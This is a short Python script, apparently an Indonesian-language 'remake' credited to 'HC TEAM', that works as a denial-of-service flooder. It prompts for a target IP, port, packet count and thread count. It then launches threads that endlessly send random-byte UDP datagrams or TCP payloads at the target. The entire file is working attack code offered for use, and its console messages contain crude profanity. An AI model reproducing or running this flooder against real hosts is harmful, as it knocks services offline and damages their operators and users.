import random
import socket
import threading

print("\033[92m")
print("""
    Remake by:

░█████╗░██████╗░██████╗░██╗░██████╗
██╔══██╗██╔══██╗██╔══██╗██║██╔════╝
██║░░██║██████╔╝██████╦╝██║╚█████╗░
██║░░██║██╔══██╗██╔══██╗██║░╚═══██╗
╚█████╔╝██║░░██║██████╦╝██║██████╔╝
░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝╚═════╝░

""")
print("\033[97m")
ip= str(input(" ip Target:"))
port= int(input(" port Target:"))
choice = str(input(" Gas Kontol?(y/n):"))
times= int(input(" Paket target :"))
threads= int(input(" threads target:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[DDOS!!]","[DDOS!!]","[DDOS!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" HC TEAM NI DEK SENGOL DONG!!!")
		except:
			print("[!] EROR KONTOL KAYAK NYA DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[DDOS!!]","[DDOS!!]","[DDOS!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" HC TEAM NI DEK SENGOL DONG!!!")
		except:
			s.close()
			print("[*] EROR KONTOL KAYAK NYA DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()